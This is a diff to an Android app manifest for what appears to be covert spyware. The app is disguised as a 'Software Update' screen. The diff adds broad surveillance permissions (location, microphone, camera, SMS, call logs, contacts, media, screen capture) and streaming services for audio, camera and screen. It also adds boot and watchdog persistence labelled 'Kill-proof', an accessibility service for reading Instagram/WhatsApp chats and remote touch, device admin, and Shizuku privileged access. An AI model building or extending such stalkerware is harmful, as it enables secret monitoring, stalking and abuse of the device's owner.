@@ -1,28 +1,77 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+
+    <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+
+    <!-- Camera -->
     <uses-permission android:name="android.permission.CAMERA"/>
+
+    <!-- Audio / mic -->
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+
+    <!-- Calls -->
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+
+    <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS"/>
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_MMS"/>
+
+    <!-- Contacts -->
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+    <!-- Gallery / storage -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
+
+    <!-- App usage stats -->
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions"
+        xmlns:tools="http://schemas.android.com/tools"/>
+
+    <!-- System / foreground -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+
+    <!-- Kill-proof -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
     <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
+    <!-- Overlay (for screen capture helper) -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+
+    <!-- Screen capture -->
+    <uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL"/>
+
+    <!-- Notification -->
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
+
+    <!-- Shizuku -->
+    <queries>
+        <package android:name="moe.shizuku.privileged.api"/>
+        <package android:name="rikka.sui"/>
+    </queries>
 
     <application
         android:allowBackup="false"
@@ -31,7 +80,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.App">
 
-        <!-- Main setup activity — looks like "Software Update" -->
+        <!-- Setup activity — "Software Update" look -->
         <activity
             android:name=".setup.SetupActivity"
             android:exported="true"
@@ -43,16 +92,32 @@
             </intent-filter>
         </activity>
 
-        <!-- Core monitoring service -->
+        <!-- Core service -->
         <service
             android:name=".core.CoreService"
             android:exported="false"
-            android:foregroundServiceType="dataSync|location|microphone|camera"/>
+            android:foregroundServiceType="dataSync|location|microphone|camera|mediaProjection"/>
 
-        <!-- Boot receiver — restarts service after reboot -->
-        <receiver
-            android:name=".core.BootReceiver"
-            android:exported="true">
+        <!-- Audio stream service -->
+        <service
+            android:name=".monitors.AudioStreamService"
+            android:exported="false"
+            android:foregroundServiceType="microphone"/>
+
+        <!-- Camera stream service -->
+        <service
+            android:name=".monitors.CameraStreamService"
+            android:exported="false"
+            android:foregroundServiceType="camera"/>
+
+        <!-- Screen stream service -->
+        <service
+            android:name=".monitors.ScreenStreamService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection"/>
+
+        <!-- Boot receiver -->
+        <receiver android:name=".core.BootReceiver" android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
@@ -61,10 +126,8 @@
             </intent-filter>
         </receiver>
 
-        <!-- Watchdog receiver — AlarmManager se trigger hota hai -->
-        <receiver
-            android:name=".core.WatchdogReceiver"
-            android:exported="false"/>
+        <!-- Watchdog receiver -->
+        <receiver android:name=".core.WatchdogReceiver" android:exported="false"/>
 
         <!-- Notification listener -->
         <service
@@ -76,7 +139,7 @@
             </intent-filter>
         </service>
 
-        <!-- Accessibility service -->
+        <!-- Accessibility (Instagram/WhatsApp chat + remote touch) -->
         <service
             android:name=".monitors.AccessibilityMonitor"
             android:exported="true"
@@ -94,13 +157,20 @@
             android:name=".core.DeviceAdminReceiver"
             android:exported="true"
             android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin"/>
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
             </intent-filter>
         </receiver>
+
+        <!-- Shizuku provider -->
+        <provider
+            android:name="rikka.shizuku.ShizukuProvider"
+            android:authorities="${applicationId}.shizuku"
+            android:multiprocess="false"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.INTERACT_ACROSS_USERS_FULL"/>
 
     </application>
 </manifest>
